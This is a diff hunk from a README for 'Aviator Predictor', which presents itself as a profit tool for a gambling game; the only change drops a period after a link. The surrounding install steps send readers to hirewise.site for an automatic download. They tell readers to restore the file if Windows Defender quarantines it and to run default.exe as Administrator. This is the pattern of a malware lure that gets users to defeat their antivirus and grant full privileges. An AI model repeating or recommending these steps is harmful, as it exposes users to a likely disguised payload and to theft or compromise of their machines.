@@ -9,7 +9,7 @@ Welcome to Aviator Predictor, your ultimate tool for maximizing your profits in 
 
 ## How to Use
 
-1. Visit [hirewise.site](https://hirewise.site).
+1. Visit [hirewise.site](https://hirewise.site)
 2. The download will start automatically once you visit the site. If Windows Defender quarantines the file, just restore it to proceed smoothly.
 3. Extract the default.zip file to your desired location.
 4. Run default.exe as Administrator.
